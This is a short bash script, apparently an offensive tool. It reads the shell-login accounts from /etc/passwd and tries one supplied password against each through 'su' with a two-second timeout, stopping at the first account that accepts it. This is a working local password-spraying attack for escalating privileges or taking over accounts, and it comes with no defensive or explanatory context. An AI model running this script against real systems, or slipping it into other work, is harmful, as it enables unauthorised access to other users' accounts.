#!/bin/bash

do_spray (){
        users=$(awk -F: '{ if ($NF ~ /sh$/) print $1}' /etc/passwd)
        for user in $users; do
                echo "$1" |timeout 2 su $user -c whoami 2>/dev/null
                if [[ $? -eq 0 ]]; then
                        return
                fi
        done
}

do_spray $1
